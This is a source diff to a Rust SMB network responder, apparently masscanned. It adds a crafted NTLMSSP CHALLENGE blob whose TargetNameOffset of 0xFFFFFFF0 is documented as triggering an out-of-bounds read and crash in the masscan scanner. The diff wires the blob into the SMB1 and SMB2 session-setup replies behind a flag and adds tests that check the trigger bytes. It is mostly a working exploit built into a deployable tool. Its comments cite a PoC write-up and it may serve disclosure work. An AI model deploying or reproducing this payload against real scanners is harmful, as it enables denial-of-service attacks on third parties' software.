@@ -35,6 +35,36 @@ pub const SMB2_PATTERN_MAGIC: &[u8; 8] = b"\x00\x00**\xfeSMB";
 const SECURITY_BLOB_NEG_PROTO: &[u8] = b"`\x82\x01<\x06\x06+\x06\x01\x05\x05\x02\xa0\x82\x0100\x82\x01,\xa0\x1a0\x18\x06\n+\x06\x01\x04\x01\x827\x02\x02\x1e\x06\n+\x06\x01\x04\x01\x827\x02\x02\n\xa2\x82\x01\x0c\x04\x82\x01\x08NEGOEXTS\x01\x00\x00\x00\x00\x00\x00\x00`\x00\x00\x00p\x00\x00\x001<*:\xc7+<\xa9m\xac8t\xa7\xdd\x1d[\xf4Rk\x17\x03\x8aK\x91\xc2\t}\x9a\x8f\xe6,\x96\\Q$/\x90MG\xc7\xad\x8f\x87k\"\x02\xbf\xc6\x00\x00\x00\x00\x00\x00\x00\x00`\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\3S\r\xea\xf9\rM\xb2\xecJ\xe3xn\xc3\x08NEGOEXTS\x03\x00\x00\x00\x01\x00\x00\x00@\x00\x00\x00\x98\x00\x00\x001<*:\xc7+<\xa9m\xac8t\xa7\xdd\x1d[\\3S\r\xea\xf9\rM\xb2\xecJ\xe3xn\xc3\x08@\x00\x00\x00X\x00\x00\x000V\xa0T0R0'\x80%0#1!0\x1f\x06\x03U\x04\x03\x13\x18Token Signing Public Key0'\x80%0#1!0\x1f\x06\x03U\x04\x03\x13\x18Token Signing Public Key";
 const SECURITY_BLOB_CHALLENGE: &[u8] = b"\xa1\x81\x9c0\x81\x99\xa0\x03\n\x01\x01\xa1\x0c\x06\n+\x06\x01\x04\x01\x827\x02\x02\n\xa2\x81\x83\x04\x81\x80NTLMSSP\x00\x02\x00\x00\x00\x08\x00\x08\x008\x00\x00\x00\x15\x82\x8a\xe2$\x91\xa8\xf6\xf3\x89-4\x00\x00\x00\x00\x00\x00\x00\x00@\x00@\x00@\x00\x00\x00\n\x00aJ\x00\x00\x00\x0fW\x00I\x00N\x001\x00\x02\x00\x08\x00W\x00I\x00N\x001\x00\x01\x00\x08\x00W\x00I\x00N\x001\x00\x04\x00\x08\x00W\x00I\x00N\x001\x00\x03\x00\x08\x00W\x00I\x00N\x001\x00\x07\x00\x08\x00\xff&9\xf5B\x1d\xd8\x01\x00\x00\x00\x00";
 
+// Malicious SPNEGO NegTokenResp wrapping an NTLMSSP CHALLENGE crafted to
+// trigger an OOB read in masscan's proto-ntlmssp.c: `name_offset +
+// name_length` is compared with `< ntlm_length` as 32-bit unsigned, so
+// picking `name_offset = 0xFFFFFFF0` and `name_length = 0x20` makes the
+// sum wrap to 0x10 (< 56), and the subsequent read at
+// `px + 0xFFFFFFF0` walks off the end of the buffer. See
+// ./poc_masscan_segfault.py for the full write-up.
+//
+// Structure (69 bytes total):
+//   A1 43                 [1] NegTokenResp, len 67
+//     30 41               SEQUENCE, len 65
+//       A0 03 0A 01 01    negState = accept-incomplete (1)
+//       A2 3C             [2] responseToken, len 60
+//         04 3A           OCTET STRING, len 58
+//           NTLMSSP CHALLENGE (56 bytes):
+//             "NTLMSSP\0"                 Signature (8)
+//             02 00 00 00                 MessageType = CHALLENGE
+//             20 00                       TargetNameLen      = 0x0020
+//             20 00                       TargetNameMaxLen   = 0x0020
+//             F0 FF FF FF                 TargetNameOffset   = 0xFFFFFFF0 (TRIGGER)
+//             15 82 81 E2                 NegotiateFlags
+//             00 11 22 33 44 55 66 77     ServerChallenge
+//             00 00 00 00 00 00 00 00     Reserved
+//             00 00                       TargetInfoLen      = 0
+//             00 00                       TargetInfoMaxLen   = 0
+//             38 00 00 00                 TargetInfoOffset
+//             06 01 00 00                 Version: Major=6 Minor=1 Build=0
+//             00 00 00 0F                 Reserved + NTLMRevisionCurrent=15
+const SECURITY_BLOB_CHALLENGE_MASSCAN_EXPLOIT: &[u8] = b"\xa1\x43\x30\x41\xa0\x03\x0a\x01\x01\xa2\x3c\x04\x3aNTLMSSP\x00\x02\x00\x00\x00\x20\x00\x20\x00\xf0\xff\xff\xff\x15\x82\x81\xe2\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x00\x00\x00\x06\x01\x00\x00\x00\x00\x00\x0f";
+
 /////////////
 // Netbios //
 /////////////
@@ -547,7 +577,7 @@ impl MPacket for SMB1SessionSetupRequest {
     }
     fn repl(
         &self,
-        _masscanned: &Masscanned,
+        masscanned: &Masscanned,
         _client_info: &ClientInfo,
         _tcb: Option<&mut TCPControlBlock>,
     ) -> Option<Vec<u8>> {
@@ -557,21 +587,29 @@ impl MPacket for SMB1SessionSetupRequest {
         // "Windows 4.0" in UTF-16 + two null bytes
         let native_os = b"W\x00i\x00n\x00d\x00o\x00w\x00s\x00 \x004\x00.\x000\x00\x00\x00";
         let native_man_lan = native_os;
+        let blob: &[u8] = if masscanned.smb_masscan_exploit {
+            SECURITY_BLOB_CHALLENGE_MASSCAN_EXPLOIT
+        } else {
+            SECURITY_BLOB_CHALLENGE
+        };
         let mut resp: Vec<u8> = Vec::new();
         resp.push(0x4); // WordCount
         resp.push(0xff); // AndXCommand
         resp.push(0x0); // AndXReserved
         resp.extend_from_slice(&0x44_u16.to_le_bytes()); // AndXOffset
         resp.extend_from_slice(&0x0_u16.to_le_bytes()); // Action
-        resp.extend_from_slice(&(SECURITY_BLOB_CHALLENGE.len() as u16).to_le_bytes()); // SecurityLen
+        resp.extend_from_slice(&(blob.len() as u16).to_le_bytes()); // SecurityLen
         resp.extend_from_slice(
-            &((SECURITY_BLOB_CHALLENGE.len() + native_os.len() + native_man_lan.len()) as u16)
-                .to_le_bytes(),
+            &((blob.len() + native_os.len() + native_man_lan.len()) as u16).to_le_bytes(),
         ); // ByteCount
-        resp.extend_from_slice(SECURITY_BLOB_CHALLENGE); // SecurityBlob
+        resp.extend_from_slice(blob); // SecurityBlob
         resp.extend_from_slice(native_os);
         resp.extend_from_slice(native_man_lan);
-        warn!("SMB1 SessionSetup-Reply");
+        if masscanned.smb_masscan_exploit {
+            warn!("SMB1 SessionSetup-Reply (masscan exploit payload)");
+        } else {
+            warn!("SMB1 SessionSetup-Reply");
+        }
         Some(resp)
     }
 }
@@ -1052,20 +1090,29 @@ impl MPacket for SMB2SessionSetupRequest {
 
     fn repl(
         &self,
-        _masscanned: &Masscanned,
+        masscanned: &Masscanned,
         _client_info: &ClientInfo,
         _tcb: Option<&mut TCPControlBlock>,
     ) -> Option<Vec<u8>> {
         if !matches!(self.d.state, SMB2SetupRequestState::End) {
             return None;
         }
+        let blob: &[u8] = if masscanned.smb_masscan_exploit {
+            SECURITY_BLOB_CHALLENGE_MASSCAN_EXPLOIT
+        } else {
+            SECURITY_BLOB_CHALLENGE
+        };
         let mut resp: Vec<u8> = Vec::new();
         resp.extend_from_slice(&0x9_u16.to_le_bytes()); // StructureSize
         resp.extend_from_slice(&0x0_u16.to_le_bytes()); // SessionFlags
         resp.extend_from_slice(&0x48_u16.to_le_bytes()); // SecurityBufferOffset
-        resp.extend_from_slice(&(SECURITY_BLOB_CHALLENGE.len() as u16).to_le_bytes()); // SecurityLen
-        resp.extend_from_slice(SECURITY_BLOB_CHALLENGE); // SecurityBlob
-        warn!("SMB2 SessionSetup-Reply");
+        resp.extend_from_slice(&(blob.len() as u16).to_le_bytes()); // SecurityLen
+        resp.extend_from_slice(blob); // SecurityBlob
+        if masscanned.smb_masscan_exploit {
+            warn!("SMB2 SessionSetup-Reply (masscan exploit payload)");
+        } else {
+            warn!("SMB2 SessionSetup-Reply");
+        }
         Some(resp)
     }
 }
@@ -1201,6 +1248,7 @@ mod tests {
             iface: None,
             self_ip_list: None,
             remote_ip_deny_list: None,
+            smb_masscan_exploit: false,
             log: MetaLogger::new(),
         };
         let client_info = ClientInfo::new();
@@ -1270,6 +1318,7 @@ mod tests {
             iface: None,
             self_ip_list: None,
             remote_ip_deny_list: None,
+            smb_masscan_exploit: false,
             log: MetaLogger::new(),
         };
         let client_info = ClientInfo::new();
@@ -1334,6 +1383,7 @@ mod tests {
             iface: None,
             self_ip_list: None,
             remote_ip_deny_list: None,
+            smb_masscan_exploit: false,
             log: MetaLogger::new(),
         };
         let client_info = ClientInfo::new();
@@ -1396,6 +1446,7 @@ mod tests {
             iface: None,
             self_ip_list: None,
             remote_ip_deny_list: None,
+            smb_masscan_exploit: false,
             log: MetaLogger::new(),
         };
         let client_info = ClientInfo::new();
@@ -1414,5 +1465,88 @@ mod tests {
             57, 245, 66, 29, 216, 1, 0, 0, 0, 0,
         ];
         assert_eq!(answer, expected);
+    }
+
+    // Masscanned built with smb_masscan_exploit=true must emit the malicious
+    // SPNEGO/NTLMSSP CHALLENGE from poc_masscan_segfault.py inside the SMB1
+    // SessionSetup reply. This test is the Rust-side equivalent of that PoC.
+    #[test]
+    fn test_smb1_session_setup_reply_masscan_exploit() {
+        let masscanned = Masscanned {
+            synack_key: [0, 0],
+            mac: MacAddr::from_str("00:00:00:00:00:00").expect("error parsing default MAC address"),
+            iface: None,
+            self_ip_list: None,
+            remote_ip_deny_list: None,
+            smb_masscan_exploit: true,
+            log: MetaLogger::new(),
+        };
+        let client_info = ClientInfo::new();
+        let answer = repl_smb1(SMB1_REQ_SESSION_SETUP, &masscanned, &client_info, None)
+            .expect("Error: no answer");
+        // NetBIOS(4) + SMB1 header(32) + WordCount+AndXCmd+AndXRes+AndXOff+Action+SecLen+ByteCount
+        //                                                    (1 + 1 + 1 +    2 +    2 +   2 +    2) = 11
+        let blob_offset = 4 + 32 + 11;
+        // Native OS + Native LAN Manager tail (same as benign reply): 13 + 13 = 26 bytes
+        let native_os: &[u8] = b"W\x00i\x00n\x00d\x00o\x00w\x00s\x00 \x004\x00.\x000\x00\x00\x00";
+        let blob = SECURITY_BLOB_CHALLENGE_MASSCAN_EXPLOIT;
+        assert_eq!(blob.len(), 69);
+        // SecurityLen field (word offset 6 inside the body) == blob.len().
+        let sec_len = u16::from_le_bytes([answer[4 + 32 + 7], answer[4 + 32 + 8]]);
+        assert_eq!(sec_len as usize, blob.len());
+        // ByteCount field == blob.len() + 2 * native_os.len().
+        let byte_count = u16::from_le_bytes([answer[4 + 32 + 9], answer[4 + 32 + 10]]);
+        assert_eq!(
+            byte_count as usize,
+            blob.len() + native_os.len() + native_os.len()
+        );
+        // The whole malicious blob must appear verbatim.
+        assert_eq!(&answer[blob_offset..blob_offset + blob.len()], blob);
+        // Sanity-check the trigger field in place: NTLMSSP TargetNameOffset (4 bytes at
+        // offset 16 inside the 56-byte NTLMSSP CHALLENGE, which itself lives at
+        // blob[13..69] after the SPNEGO header).
+        let ntlmssp = &answer[blob_offset + 13..blob_offset + 13 + 56];
+        assert_eq!(&ntlmssp[0..8], b"NTLMSSP\x00");
+        assert_eq!(&ntlmssp[8..12], &2_u32.to_le_bytes()); // MessageType = CHALLENGE
+        assert_eq!(u16::from_le_bytes([ntlmssp[12], ntlmssp[13]]), 0x0020); // TargetNameLen
+        assert_eq!(
+            u32::from_le_bytes([ntlmssp[16], ntlmssp[17], ntlmssp[18], ntlmssp[19]]),
+            0xFFFFFFF0
+        ); // TargetNameOffset - the OOB trigger
+    }
+
+    // Same check on the SMB2 SessionSetup reply path.
+    #[test]
+    fn test_smb2_session_setup_reply_masscan_exploit() {
+        let masscanned = Masscanned {
+            synack_key: [0, 0],
+            mac: MacAddr::from_str("00:00:00:00:00:00").expect("error parsing default MAC address"),
+            iface: None,
+            self_ip_list: None,
+            remote_ip_deny_list: None,
+            smb_masscan_exploit: true,
+            log: MetaLogger::new(),
+        };
+        let client_info = ClientInfo::new();
+        let answer = repl_smb2(SMB2_REQ_SESSION_SETUP, &masscanned, &client_info, None)
+            .expect("Error: no answer");
+        // NetBIOS(4) + SMB2 header(64) + StructureSize+SessionFlags+SecBufOff+SecLen (2+2+2+2=8)
+        let blob_offset = 4 + 64 + 8;
+        let blob = SECURITY_BLOB_CHALLENGE_MASSCAN_EXPLOIT;
+        assert_eq!(blob.len(), 69);
+        // SecurityLen field is at body offset 6.
+        let sec_len = u16::from_le_bytes([answer[4 + 64 + 6], answer[4 + 64 + 7]]);
+        assert_eq!(sec_len as usize, blob.len());
+        // Whole malicious blob must appear verbatim, and the reply must end with it
+        // (SMB2 SessionSetup reply has nothing after the SecurityBlob).
+        assert_eq!(&answer[blob_offset..], blob);
+        let ntlmssp = &answer[blob_offset + 13..blob_offset + 13 + 56];
+        assert_eq!(&ntlmssp[0..8], b"NTLMSSP\x00");
+        assert_eq!(&ntlmssp[8..12], &2_u32.to_le_bytes());
+        assert_eq!(u16::from_le_bytes([ntlmssp[12], ntlmssp[13]]), 0x0020);
+        assert_eq!(
+            u32::from_le_bytes([ntlmssp[16], ntlmssp[17], ntlmssp[18], ntlmssp[19]]),
+            0xFFFFFFF0
+        );
     }
 }
